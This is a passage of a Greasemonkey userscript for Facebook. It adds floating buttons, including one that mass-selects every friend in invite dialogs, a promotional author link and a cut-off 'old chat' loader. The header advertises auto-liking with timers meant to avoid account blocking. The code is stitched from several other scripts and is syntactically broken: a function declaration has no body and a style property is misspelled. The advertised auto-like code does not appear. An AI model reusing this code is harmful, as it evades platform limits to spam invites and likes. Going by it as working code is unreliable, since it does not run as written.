// ==UserScript==
// @name			mini Cpanle Facebook v3 En + -update redcode kjp _ SadMalk
// @namespace		mini Cpanle Facebook redcode kjp -- SadMalk
// @description		     mini Cpanle AutoLike Facebook coded by RedCode kjp & SAD Mlk. ALike status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author		    RedCode kjp & SAD Mlk _ v3
// @authorURL		https://www.facebook.com/info.44.you
// @icon		    https://lh3.googleusercontent.com/-u8SK_UiW-Eo/UaapvqdqH4I/AAAAAAAAAEI/tPbYdbAxabs/s800/auto%2520like.png
// @version         V11
// @include         http://www.facebook.com/*
// @include         https://www.facebook.com/*
// @exclude 	    htt*://apps.facebook.com/*
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*
// @require         http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// Copyright (c) 2012, Cyserrex
// Auto Like/Unlike, Expand All Comments, Auto Confirm/Unconfirm Friends Request.


// ==/UserScript==

/* START: This part of the code was written (partialy) by Vaughan Chandler for FFixer, special thanks to him :) */

	
body = document.body;
if(body != null) 
{
 div = document.createElement("div");
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+90px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#3B5998";
 div.style.border = "2.5px solid #585858";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#F5F5F5' href='' title='Refresh'><center>Reload</center></a>"
 body.appendChild(div);
}





if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+111px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#3B5998";
 div.style.border = "2.5px solid #585858";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#F5F5F5' onclick='invite()'><center>Invite Them All</center></a></a>"
 body.appendChild(div);

 unsafeWindow.invite = function()


(function () {
	
	// Global variables.
	var inviteDialog, friendContainer, executing, i, l, scrollTimer, fieldError = false,
		classNames = {
			inviteDialog : ['eventInviteLayout', 'standardLayout'],
			friendUpperNodeClassName : 'checkableListItem',
			friendContainer : 'fbProfileBrowserListContainer',
			textFieldDefaultValue : 'textInput inputtext DOMControl_placeholder',
			textFieldModifiedValue : 'textInput inputtext',
			enumeration : 'enumeration'
		}, names = {
			friendCheckButtons : 'checkableitems[]'
		}, ids = {
			inviteDialog : 'fb_multi_friend_selector_wrapper'
		};
	
	
	// Function for clicking links (<a> tags).
	function clickLink(elm) {
		var evt = document.createEvent('MouseEvents');
		evt.initMouseEvent('click', true, false, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);
		elm.dispatchEvent(evt);
	}
	
	// Function to get cumulative (real) position of element.
	// Thanks to Patrick H. Lauke at QuirksMode (http://www.quirksmode.org/js/findpos.html).
	function getCumulativePosition(obj) {
		var curleft = 0, curtop = curleft;
		
		// Iterate through all offsetParents.
		if (obj.offsetParent) {
			do {
				// Add the offsetParent's offsets to the variables holding the offset-values.
				curleft += obj.offsetLeft;
				curtop += obj.offsetTop;
				
				// Iterate.
				obj = obj.offsetParent;
			} while (obj);
		}
		
		return [curleft, curtop];
	}
	
	// Function for checking if an element is below the viewport / out of view.
	function isBelowViewport(container, element) {
		// Gather necessary data.
		var scrolledFromTop = container.scrollTop,
			viewportHeight = container.offsetHeight,
			totalHeight = container.scrollHeight,
			elementHeight = element.offsetHeight;
		
		// Calculate how much is left from bottom of viewport to top of page.
		var leftFromTop = scrolledFromTop + viewportHeight;
		
		// Calculate how much is left from bottom of viewport to bottom of page.
		var leftFromBottom = totalHeight - leftFromTop;
		
		// If "bottom of viewport to bottom of page" > "element height", element is below viewport.
		return leftFromBottom > elementHeight ? true : false;
	}
	
	// Fade function (element, duration in seconds, from opacity, to opacity[, callback]).
	function fade(elm, time, from, to, fadeCallback) {
		/*
			updaterate =     interval (in ms) between each execution of the fade function (below)
			neenedcalcs =    (milliseconds in one second * input seconds) / milliseconds to allot on
			currentcalcs =   number incrementing with the number of calculations performed
			opacityperloop = (from what opacity - to what opacity)[array of opacity to loop through] / calculations to allot on
			currentopacity = well ... current opacity :)
		*/
		var updaterate = 10, neededcalcs = (1000 * time) / updaterate,
			currentcalcs = 0, opacityperloop = (from - to) / neededcalcs, currentopacity = from;
		
		// Check for already executing function, remove if found.
		if (this.fadeTimer) {
			clearTimeout(this.fadeTimer);
			delete this.fadeTimer;
		}
		
		// Initiate fade.
		// First, set initial opacity.
		elm.style.opacity = currentopacity;
		
		// Use recursive loop with setTimeout instead of setInterval to make sure previous execution is finished before next starts.
		(function loop() {
			this.fadeTimer = setTimeout(function () {
				// If haven't reached number of calculations yet.
				if (currentcalcs !== neededcalcs) {
					// Reduce / increase current opacity.
					currentopacity -= opacityperloop;
					// Set opacity.
					elm.style.opacity = currentopacity;
					// Iterate.
					currentcalcs += 1;
					
					// Continue.
					loop();
					
				// If done.
				} else {
					// If element has negative opacity, remove it.
					if (opacityperloop > 0) {
						elm.parentNode.removeChild(elm);
					}
					
					// Delete timer variable to clear up and rid place for later.
					delete this.fadeTimer;
					
					// If callback is passed, execute it.
					if (fadeCallback) {
						fadeCallback();
					}
				}
			}, updaterate);
		}());
	}
	
	
	// Function to alert errors in a non-blocking way.
	// Message is an array, each element (created with document.createTextNode) being one line.
	// Position is an array consisting of two elements, a "padding-left" value and a "padding-top" value.
	function errorAlert(message, positionArray, errorAlertCallback) {
		// Try executing the non-blocking way. If nothing else works, fall back to window.alert.
		try {
			// Function for appending the message to the container.
			function appendText(textArray, elm) {
				for (i = 0, l = textArray.length; i < l; i += 1) {
					elm.appendChild(textArray[i]);
					
					// Append line break after element.
					elm.appendChild(document.createElement('br'));
				}
			}
			
			
			// Outer container.
			var container = document.createElement('div');
			container.className = 'alertBox';
			container.id = 'errorMessageBox';
			container.style.opacity = 0;
			
			// Inner container.
			var innerContainer = document.createElement('div');
			innerContainer.className = 'textContainer';
			
			// Header. Easier implemented separately than appending to message array.
			var header = document.createElement('b');
			header.appendChild(document.createTextNode('Error!'));
			header.appendChild(document.createElement('br'));
			
			// OK button.
			var OKButtonContainer = document.createElement('div'),
				OKButton = document.createElement('input');
			
			OKButton.type = 'button';
			OKButton.value = 'OK';
			OKButton.className = 'uiButton';
			
			// It's function.
			// If any callback is present, append it as a callback to the fade function.
			OKButton.addEventListener('click', function () {
				fade(container, 0.1, container.style.opacity, 0, (errorAlertCallback && function () {
					errorAlertCallback();
				}));
			}, false);
			
			// OK button container.
			OKButtonContainer.className = 'OKButtonContainer';
			OKButtonContainer.appendChild(OKButton);
			
			
			// Append elements.
			innerContainer.appendChild(header);
			appendText(message, innerContainer);
			innerContainer.appendChild(OKButtonContainer);
			container.appendChild(innerContainer);
			
			// Append container to outer container.
			// Try first at the inviteDialog, and fall back to document.body.
			try {
				inviteDialog.appendChild(container);
			} catch (e) {
				document.body.appendChild(container);
			}
			
			// Apply position.
			container.style.position = 'fixed';
			
			// If position array is present, and if two values exact, set it to those.
			if (positionArray && positionArray.length === 2) {
				// Remove the width and height of the container from the given positions,
				// to make the lower left corner what the position is relative to.
				var pixelsFromLeft = positionArray[0], pixelsFromTop = positionArray[1] - container.offsetHeight;
				
				container.style.left = pixelsFromLeft.toString() + 'px';
				container.style.top = pixelsFromTop.toString() + 'px';
			// Else, set it to default values.
			} else {
				container.style.right = '4em';
				container.style.bottom = '5em';
			}
			
			// Fade it in.
			fade(container, 0.2, container.style.opacity, 0.9);
			
		// If nothing else works, fall back to window.alert.
		} catch (f) {
			if (message) {
				var messageInString = '';
				
				for (i = 0, l = message.length; i < l; i += 1) {
					messageInString += message[i].textContent + '\n';
				}
				
				alert(messageInString);
				
				if (errorAlertCallback) {
					errorAlertCallback();
				}
			}
		}
	}
	
	
	// Function for adding the button.
	function addButton(inviteDialogParameter, isSubElement) {
		inviteDialog = inviteDialogParameter;
		
		if (inviteDialog !== undefined && !executing && !document.getElementById('selectAllButton')) {
			// Set variable indicating that the script has been executed already, to prevent multiple executions.
			executing = true;
			
			// Create button.
			var selectButton = document.createElement('input');
			selectButton.type = 'button';
			selectButton.className = 'uiButton';
			selectButton.id = 'selectAllButton';
			
			// Button texts.
			var selectButtonText1 = 'Select', selectButtonText2 = 'Unselect all';
			
			// Set default button text value.
			selectButton.value = selectButtonText1;
			
			// Variable for determining when user has selected people and not (clicked the button).
			var btnClicked;
			
			
			// Friend-select function.
			function selectFriends(btn) {
				// Get the checkboxes, as it's easiest to figure out if the friend is disabled this way, as well as other advantages.
				var friends = document.getElementsByName(names.friendCheckButtons)[0] ?
						document.getElementsByName(names.friendCheckButtons) :
						inviteDialog.querySelectorAll('input[type="checkbox"]:not(#autoScrollCheckBox):not(#selectAllCheckBox)'),
					forceChoose = false,
					// Set the first friend to select.
					// If no userset value, start from beginning.
					// Else, start from the given number.
					selectionStart = fields[0].value === fields[0].defaultValue ?
						0 :
						// Translate first (#1) to #0.
						parseInt(fields[0].value, 10) - 1,
					// Set the last friend to select.
					// If no userset value, select until end.
					// Else if element "selectSpanTypeCheckBox" is set, try select until the given value.
					// Else, select excactly the given number of friends.
					friendsToSelect = fields[1].value === fields[1].defaultValue ?
						selectSpanTypeCheckBox.checked ?
							// Starting later = ending sooner.
							friends.length - selectionStart :
							// Just take whole bunch; loop will break anyways.
							friends.length :
						selectSpanTypeCheckBox.checked ?
							// to #: b
							parseInt(fields[1].value, 10) - selectionStart :
							// How many?: b
							parseInt(fields[1].value, 10),
					selectedFriends = 0,
					// Checked = select b friends, starting from #a. Iterate only when selecting.
					// Not checked = select from #a to #b, iterate always.
					alwaysIterate = selectSpanTypeCheckBox.checked,
					currentFriendNumber = selectionStart;
				
				// Select friends.
				if (!btnClicked) {
					// If there is more to select, and if the next friend to select exists.
					while (friendsToSelect > selectedFriends && friends[currentFriendNumber]) {
						// Variable for determining if loop has iterated already.
						var iterated = false;
						
						// If friends is not selected and not disabled, or if user has chosen to select it anyway -> select the friend.
						if ((!friends[currentFriendNumber].checked && !friends[currentFriendNumber].disabled) || forceChoose) {
							// The anchors(links) are next to the checkboxes in the DOM.
							// Clicking the links has better performance than clicking the checkboxes.
							clickLink(friends[currentFriendNumber].nextSibling);
							
							// Iterate variable "selectedFriends".
							selectedFriends += 1;
							iterated = true;
						}
						
						if (!iterated && alwaysIterate) {
							selectedFriends += 1;
						}
						
						// Iterate currentFriendNumber.
						currentFriendNumber += 1;
					}
					
					// Change button text, and set it clicked.
					btn.value = selectButtonText2;
					btnClicked = true;
					
					// Disable user interaction because only "Unselect" is available.
					for (i = 0, l = fields.length; i < l; i += 1) {
						fields[i].disabled = true;
					}
					selectSpanTypeCheckBox.disabled = true;
				
				// Unselect friends.
				} else {
					for (i = 0, l = friends.length; i < l; i += 1) {
						// If friends is selected and not disabled, or if user has chosen to select it anyway -> unselect the friend.
						if ((friends[i].checked && !friends[i].disabled) || forceChoose) {
							// The anchors(links) are next to the checkboxes in the DOM.
							// Clicking the links has better performance than clicking the checkboxes.
							clickLink(friends[i].nextSibling);
						}
					}
					
					// Change button text, and set it unclicked.
					btn.value = selectButtonText1;
					btnClicked = false;
					
					// Enable user interaction again.
					for (i = 0, l = fields.length; i < l; i += 1) {
						fields[i].disabled = '';
					}
					selectSpanTypeCheckBox.disabled = '';
				}
			}
			
			// Button function.
			selectButton.addEventListener('click', function () {
				// Return if variable fieldError is set.
				if (fieldError) {
					return;
				}
				
				if (autoScrollCheckBox.checked) {
					autoScroll(function () {
						selectFriends(selectButton);
						
						// Add enumeration afterwards, as it is disabled meanwhile scrolling.
						addFriendEnumeration(inviteDialog);
					});
				} else {
					selectFriends(selectButton);
				}
			}, false);
			
			
			// Function to create container for an array of elements.
			function createContainer(contElmType, elmArray) {
				var divElm = document.createElement(contElmType);
				for (i = 0, l = elmArray.length; i < l; i += 1) {
					divElm.appendChild(elmArray[i]);
				}
				
				return divElm;
			}
			
			// Function to create a label for an element.
			function createLabel(textParam, forElm) {
				var labl = document.createElement('label');
				labl.appendChild(document.createTextNode(textParam));
				labl.setAttribute('for', forElm.id);
				
				return labl;
			}
			
			
			// Create the autoscroll dialog and function.
			// Create the checkbox.
			var autoScrollCheckBox = document.createElement('input');
			autoScrollCheckBox.type = 'checkbox';
			autoScrollCheckBox.id = 'autoScrollCheckBox';
			// Pre-check it.
			autoScrollCheckBox.defaultChecked = 'true';
			// Align the label on line with checkbox.
			autoScrollCheckBox.style.verticalAlign = 'middle';
			
			// Auto scroll function.
			function autoScroll(callback) {
				// Store previous last friends scrolled into view to check for progress.
				var autoScrollDisabled, watcher;
				
				function scrollFriends(callingFromWatcher) {
					if (autoScrollDisabled) {
						return;
					}
					
					var lastUL = inviteDialog.getElementsByTagName('ul')[inviteDialog.getElementsByTagName('ul').length - 1],
						scrollableDiv = lastUL.offsetParent,
						lastFriend = lastUL.lastChild;
					
					// If last element is below viewport, scroll it into view.
					if (isBelowViewport(scrollableDiv, lastFriend)) {
						// Only clear timer if going to scroll.
						if (scrollTimer) {
							clearTimeout(scrollTimer);
						}
						
						// Scroll last visible friend into view.
							// Old version.
							// lastFriend.scrollIntoView(alignToTop);
						// Top of viewport scrolled from top = total height - viewport heigh.
						scrollableDiv.scrollTop = scrollableDiv.scrollHeight - scrollableDiv.offsetHeight;
						
						// Set timer to check if there is any new elements loaded after x milliseconds.
						// If not, remove scrolling on new element insertion and initiate callback.
						scrollTimer = setTimeout(function () {
							autoScrollDisabled = true;
							clearTimeout(scrollTimer);
							
							inviteDialog.removeEventListener('DOMNodeInserted', watcher, false);
							
							if (callback) {
								callback();
							}
						}, 1000);
					// If last friend is visible (all scrolled down already) before any scrolling is executed,
					// disable the scroll function, initiate callback and return.
					} else if (!callingFromWatcher) {
						autoScrollDisabled = true;
						
						if (callback) {
							callback();
						}
						
						return;
					}
					
					return true;
				}
				
				watcher = function () {
					if (!scrollFriends(true)) {
						// If returning positively from scroll-function (which indicates that watching for new elements should be stopped),
						// remove the watcher and re-enable the scroll-function for later use.
						inviteDialog.removeEventListener('DOMNodeInserted', watch, false);
						autoScrollDisabled = false;
					}
				};
				
				// Initiate, and initiate watcher if not already scrolled to the bottom (indicated by a negative return).
				if (scrollFriends()) {
					inviteDialog.addEventListener('DOMNodeInserted', watcher, false);
				}
			}
			
			// Create it's label.
			var autoScrollCheckBoxLabel = createLabel('Enable autoscrolling?', autoScrollCheckBox);
			
			// Append them to a container.
			var autoScrollCont = createContainer('span', [autoScrollCheckBoxLabel, autoScrollCheckBox]);
			
			
			// Create select span dialogs and their labels.			
			// Create and style the "from friend #x field".
			var fromField = document.createElement('input');
			fromField.type = 'text';
			fromField.id = 'fromField';
			fromField.className = classNames.textFieldDefaultValue;
			fromField.style.width = '2.5em';
			fromField.style.textAlign = 'right';
			var fromFieldDefaultValues = ['first', 'first'];
			fromField.defaultValue = fromFieldDefaultValues[0];
			// Create it's label
			var fromFieldLabelValues = ['Select friends from #:', 'Select friends from #:'],
				fromFieldLabel = createLabel(fromFieldLabelValues[0], fromField);
			
			// Create and style the "to friend #x field".
			var toField = document.createElement('input');
			toField.type = 'text';
			toField.id = 'toField';
			toField.className = classNames.textFieldDefaultValue;
			toField.style.width = '2.5em';
			toField.style.textAlign = 'right';
			var toFieldDefaultValues = ['all', 'last'];
			toField.defaultValue = toFieldDefaultValues[0];
			// Create it's label
			var toFieldLabelValues = ['How many? :', 'to #:'],
				toFieldLabel = createLabel(toFieldLabelValues[0], toField);
			
			// Variable holding the fields, to avoid having to namely reference them.
			var fields = [fromField, toField];
			
			// Create the fields' functions
			// Error alerting function. See it's declearance for information.
			function fieldErrorAlert(message, concerningElementParam) {
				// Set error variable ("fieldError").
				fieldError = true;
				
				// The concerningElement variable is either the passed element, or "this".
				// The relativeElement variable is "this" because this function is called with "func.call(thisField, [msg])"
				// to pass the "thisField" in a good way.
				var concerningElement = concerningElementParam || this, relativeElement = this, positionArray;
				
				function errorAlertCallback() {
					concerningElement.value = '';
					concerningElement.focus();
				}
				
				// If a relativeElement is present, calculate it's position, and set postitionArray from calculations.
				if (relativeElement) {
					var relativeElementPosition = getCumulativePosition(relativeElement), offsetPixelsToRight = 30, offsetPixelsToBottom = 10;
					
					positionArray = [relativeElementPosition[0] - offsetPixelsToRight, relativeElementPosition[1] - offsetPixelsToBottom];
				}
				
				errorAlert(message, positionArray, errorAlertCallback);
			}
			
			function fieldFocusEventListener() {
				// Get this field.
				var thisField = this;
				
				// Reset value if no userset value.
				if (thisField.value === thisField.defaultValue) {
					thisField.value = '';
				}
				
				thisField.className = classNames.textFieldModifiedValue;
			}
			
			function fieldBlurEventListener() {
				// Get this field and the other field.
				var thisField = this;
				
				// Loop through possibilities of "thisField.value".
				switch (thisField.value) {
				case '':
					thisField.value = thisField.defaultValue;
				case thisField.defaultValue:
					thisField.className = classNames.textFieldDefaultValue;
					
					// Set variable "fieldError" to false.
					fieldError = false;
					break;
				default:
					// Make it an integer.
					thisField.value = parseInt(thisField.value, 10);
					
					if (isNaN(thisField.value)) {
						fieldErrorAlert.call(thisField, [document.createTextNode('You can\'t insert a non-numeric value.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					// If thisField.previousSibling.textContent (the associated label) does not contain "#",
					// it is not a matter of friend #x, so "0" will simply make the script select 0 friends.
					// Else, there is no friend #0, so report an error.
					} else if (thisField.previousSibling.textContent.indexOf('#') !== -1 && thisField.value === '0') {
						fieldErrorAlert.call(thisField, [document.createTextNode('There does not exist a friend #0.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					} else if (parseInt(thisField.value, 10) < 0) {
						fieldErrorAlert.call(thisField, [document.createTextNode('You can\'t insert a negative value.'),
							document.createTextNode('Please insert a valid value.')]);
						break;
					}
					
					// Set variable "fieldError" to false.
					fieldError = false;
				}
			}
			
			// Asign the functions to the fields.
			fromField.addEventListener('focus', fieldFocusEventListener, false);
			fromField.addEventListener('blur', fieldBlurEventListener, false);
			toField.addEventListener('focus', fieldFocusEventListener, false);
			toField.addEventListener('blur', fieldBlurEventListener, false);
			
			// Create and style checkbox for option to select all.
			var selectSpanTypeCheckBox = document.createElement('input');
			selectSpanTypeCheckBox.type = 'checkbox';
			selectSpanTypeCheckBox.id = 'selectSpanTypeCheckBox';
			// Align the label on line with checkbox.
			selectSpanTypeCheckBox.style.verticalAlign = 'middle';
			// Create it's label.
			var selectSpanTypeCheckBoxLabel = createLabel('Type?', selectSpanTypeCheckBox);
			// Create it's function.
			selectSpanTypeCheckBox.addEventListener('change', function () {
				// Change both the fields' values.
				fromFieldLabel.textContent = fromFieldLabel.textContent === fromFieldLabelValues[0] ? fromFieldLabelValues[1] : fromFieldLabelValues[0];
				toFieldLabel.textContent = toFieldLabel.textContent === toFieldLabelValues[0] ? toFieldLabelValues[1] : toFieldLabelValues[0];
				
				// Change both the fields' defaultValues if their values equals their defaultValues.
				// If the value of the field equals it's defaultValue, change the value to the new defaultValue.
				// Else, skip the value assignment.
				if (fromField.value === fromField.defaultValue) {
					fromField.defaultValue = fromField.value = fromField.defaultValue === fromFieldDefaultValues[0] ? fromFieldDefaultValues[1] : fromFieldDefaultValues[0];
				} else {
					fromField.defaultValue = fromField.defaultValue === fromFieldDefaultValues[0] ? fromFieldDefaultValues[1] : fromFieldDefaultValues[0];
				}
				
				if (toField.value === toField.defaultValue) {
					toField.defaultValue = toField.value = toField.defaultValue === toFieldDefaultValues[0] ? toFieldDefaultValues[1] : toFieldDefaultValues[0];
				} else {
					toField.defaultValue = toField.defaultValue === toFieldDefaultValues[0] ? toFieldDefaultValues[1] : toFieldDefaultValues[0];
				}
			}, false);
			
			// Add elements to an array, for easier later use.
			var selectSpanArray = [fromFieldLabel, fromField, toFieldLabel, toField, selectSpanTypeCheckBox];
			
			// Create space between elements.
			for (i = 0, l = selectSpanArray.length; i < l; i += 1) {
				// Add space to the right
				// Exclude specified elements
				if (selectSpanArray[i] !== toField && selectSpanArray[i] !== selectSpanTypeCheckBoxLabel) {
					selectSpanArray[i].style.marginRight = '5px';
				}
			}
			
			// Append to a container.
			var selectSpanCont = createContainer('span', selectSpanArray);
			
			
			// Create the container and inner container.
			var cont = document.createElement('tr');
			var icont = document.createElement('td');
			
			// Style/modify inner container.
			icont.setAttribute('colspan', 0);
			icont.style.textAlign = 'right';
			
			// Append elements.
			icont.appendChild(selectSpanCont);
			icont.appendChild(autoScrollCont);
			icont.appendChild(selectButton);
			cont.appendChild(icont);
			
			// Inject the button.
			inviteDialog.getElementsByTagName('tbody')[0].appendChild(cont);
			
			executing = false;
		}
	}
	
	// Function to add additional elements to the page.
	function addFriendEnumeration (friendContainerParameter) {
		friendContainer = friendContainerParameter;
		
		// Get the upper element of each friend.
		var friends = friendContainer.getElementsByClassName(classNames.friendUpperNodeClassName)[0] ?
			friendContainer.getElementsByClassName(classNames.friendUpperNodeClassName) :
			// If fails to find the upper elements directly, find each checkbox and build an array of their parents, which are the upper elements.
			(function () {
				var checkboxes = friendContainer.getElementsByName(names.friendCheckButtons)[0] ?
					friendContainer.getElementsByName(names.friendCheckButtons) :
					inviteDialog.querySelectorAll('input[type="checkbox"]:not(#autoScrollCheckBox):not(#selectAllCheckBox)'),
					friendArray = [];
				
				for (i = 0, l = checkboxes.length; i < l; i += 1) {
					friendArray[friendArray.length] = checkboxes[i].parentNode;
				}
				
				return friendArray;
			}());
		
		function createEnumerationElement (number) {
			var elm = document.createElement('div');
			
			elm.appendChild(document.createTextNode('' + number));
			elm.className = classNames.enumeration;
			
			return elm;
		}
		
		// Loop through friends and enumerate each.
		for (i = 0, l = friends.length; i < l; i += 1) {
			var currentFriend = friends[i];
			
			// If it is not enumerated already, enumerate it.
			if (!currentFriend.getElementsByClassName(classNames.enumeration)[0]) {
				// Add 1 to each enumeration to start at 1, as compensation for the non-adaptable common mind.
				var enumerationElement = createEnumerationElement(i + 1), imgChild = currentFriend.getElementsByTagName('img')[0];
				
				// If an IMG element is found under friend container, append the enumeration next to it in the DOM.
				// This is done to make the blur of non-selectable friends also apply to the enumeration.
				if (imgChild) {
					imgChild.parentNode.insertBefore(enumerationElement, imgChild);
				// Else, just append it to the container.
				} else {
					currentFriend.appendChild(enumerationElement);
				}
			}
		}
	}
	
	
	// Function to watch for node insertion (to see if the "invite box" has appeared).
	function checkForinviteDialog() {
		// Get container of invite dialog.
		var inviteDialogCheck = document.getElementsByClassName(classNames.inviteDialog[0])[0] ||
				document.getElementsByClassName(classNames.inviteDialog[1])[0] ||
				document.getElementById(ids.inviteDialog),
			enumerateContainerParameter;
		
		// If the parent DIV needed is not found directly, find it relatively to the lower friend container.
		if (!inviteDialogCheck) {
			var friendContainerCheck = document.getElementsByClassName(classNames.friendContainer)[0];
			
			if (friendContainerCheck) {
				// Loop trough parent nodes, and use first parent node containing a TABLE element.
				var containerParentNode = friendContainerCheck, containerTableElement;
				
				do {
					containerParentNode = containerParentNode.parentNode;
					containerTableElement = containerParentNode.getElementsByTagName('table')[0];
				} while (!containerTableElement);
				
				// Use the successful parent node for container parameter.
				inviteDialogCheck = containerParentNode;
				
				// Also, flag for enumeration by setting the friend container element to be passed.
				enumerateContainerParameter = friendContainerCheck;
			}
		} else {
			// Still flag for enumeration, just using the invite dialog already found as container.
			enumerateContainerParameter = inviteDialogCheck;
		}
		
		// Check for match of inviteDialogCheck, the TBODY that is later used as an insertion anchor and a selectable friend.
		if (inviteDialogCheck && inviteDialogCheck.getElementsByTagName('tbody')[0] &&
				(inviteDialogCheck.getElementsByClassName(classNames.friendUpperNodeClassName)[0] ||
				inviteDialogCheck.getElementsByName(names.friendCheckButtons)[0])) {
			// Add the button.
			addButton(inviteDialogCheck);
			
			// Add friend enumeration.
			if (enumerateContainerParameter) {
				addFriendEnumeration(enumerateContainerParameter);
			}
			
			// Can not be used at the moment. I have not found a way to re-apply the event handler.
			/* Remove node insertion watcher (it's strange, but it needs to be delayed a ms)
			window.setTimeout(function () {
				window.removeEventListener('DOMNodeInserted', checkForinviteDialog, false);
			 }, 1);
			*/
		}
	}
	
	
	// Initialize!
	// Initialize the watch.
	window.addEventListener('DOMNodeInserted', checkForinviteDialog, false);
	
	// Add CSS to error alert box and it's sub elements.
	GM_addStyle('\
	.alertBox { \
		z-index: 100; !important\
		text-align: center; \
		display: table; \
		background: -moz-linear-gradient(top,  #FFF,  #BBB); \
		border-radius: 1em; \
		border-color: #999999 #999999 #888888; \
		border-style: solid; \
		border-width: 0.1em; \
		box-shadow: 2px 3px 3px rgba(0, 0, 0, 0.2), inset 0 0 3px #888; \
		moz-box-shadow: 2px 3px 3px rgba(0, 0, 0, 0.2), inset 0 0 3px #888; \
	} \
	.alertBox b { \
		line-height: 2em; \
	} \
	.alertBox .textContainer{ \
		text-align: left; \
		display: table-cell; \
		vertical-align: middle; \
		padding-left: 1em; \
		padding-top: 0.5em; \
		padding-right: 1em; \
		padding-bottom: 0.5em; \
	} \
	.alertBox .OKButtonContainer { \
		text-align: right; \
		padding-top: 1em; \
		line-height: 2em; \
	} \
	.alertBox .OKButtonContainer button { \
		font-size: 0.8em; \
	} \
	.alertBox .OKButtonContainer button:hover { \
		color: #FFF; \
		cursor: pointer; \
	} \
	.' + classNames.enumeration + ' { \
		position: absolute; \
		left: 2.4em; \
		top: 0.1em; \
		opacity: 0.7; \
		color: white; \
		font-weight: bold; \
		text-shadow: 1px 0 0 #000, 0 -1px 0 #000, 0 1px 0 #000, -1px 0 0 #000; \
	} \
	.' + classNames.friendUpperNodeClassName + ' { \
		position: relative; \
	} \
	');
}());


}





if (body != null) {
    div = document.createElement("div");
    div.style.position = "fixed";
    div.style.display = "block";
    div.style.width = "135px";
    div.style.opacity = 0.90;
    div.style.bottom = "+26px";
    div.style.lifte = "+0px";
    div.style.backgroundColor = "#E7000F";
    div.style.border = "2.5px solid #585858";
    div.style.padding = "3px";
    div.innerHTML = "<a style='font-weight:bold;color:#F5F5F5' href='http://www.facebook.com/sadmalk2' target='_blank' title='Follow Ṥǻđ ḾǻLḱ ' ><center>Ṥǻđ ḾǻLḱ</center></a>"
    body.appendChild(div);
}


















if(body != null) 
{
 div = document.createElement("div");
 div.setAttribute('id','like2');
 div.style.position = "fixed";
 div.style.display = "block";
 div.style.width = "130px";
 div.style.opacity= 0.90;
 div.style.bottom = "+134.5px";
 div.style.left = "+0px";
 div.style.backgroundColor = "#3B5998";
 div.style.border = "2.5px solid #585858";
 div.style.padding = "3px";
 div.innerHTML = "<a style='font-weight:bold;color:#F5F5F5' onclick='oldchat()'><center>The Old Chat</center></a></a>"
 body.appendChild(div);

 unsafeWindow.oldchat = function()
(function(source) {
	// Check for function input.
	if ('function' == typeof source) {
		// Execute this function with no arguments, by adding parentheses.
		// One set around the function, required for valid syntax, and a
		// second empty set calls the surrounded function.
		source = '(' + source + ')();'
	}

	// Create a script node holding this  source code.
	var script = document.createElement('script');
	script.setAttribute("type", "application/javascript");
	script.textContent = source;

	// Insert the script node into the page, so it will run, and immediately
	// remove it to clean up.
	document.body.appendChild(script);
	document.body.removeChild(script);
})

(function(){
	var w = window;
	var d = w.document;

	var settings = {
		// open buddylist on load
		Onload:		false,

		// set buddylist sticky ( stay opened )
		Sticky:		true,

		// show online friends
		Online:		true,

		// show idle friends
		Idle:		true,

		// show mobile friends
		Mobile:		true,

		// buddylist style
		Margin:		'0px 10px',
		MinHeight:	'140px',
		Width:		'200px'
	};

	function ajax(url){
		this.Url = url;
		this.XMLHttpRequest = new w.XMLHttpRequest();
	}

	ajax.prototype = {
		'send':function(type,data,callback){
			try{
				this.Callback = callback;
				this.XMLHttpRequest.open(type,this.Url,true);
				this.XMLHttpRequest.onreadystatechange = this.stdcallback.bind(this);
				this.XMLHttpRequest.send(data);
				return true;
			}catch(e){
				return false;
			}
		},

		'stdcallback':function(){
			if(this.XMLHttpRequest.readyState === 4 && this.XMLHttpRequest.status === 200){
				if(typeof this.Callback === 'function') this.Callback(this.XMLHttpRequest);
			}
		}
	};

	var util = {
		'insertRule':function(rule){
			if(!this.css){
				this.css = d.createElement('style');
				d.querySelector('head').appendChild(this.css);
			}

			return this.css.appendChild(d.createTextNode(rule));
		}
	};

	var rocki = {
		'DOMContentLoaded':function(){
			w.toggle_list = function(r){
				if(!!w.localStorage.getItem('toggle' + r)){
					w.localStorage.removeItem('toggle' + r);
				}else{
					w.localStorage.setItem('toggle' + r,true);
				}
				w.render_chat();
			};

			w.change_order = function(r){
				var f = d.querySelectorAll('ul.fbChatOrderedList li.separator[id]');
				for(var i = 1, j = f.length; i < j; i++){
					if(f.item(i).id === r){
						w.localStorage.setItem('order' + f.item(i).id,i-1);
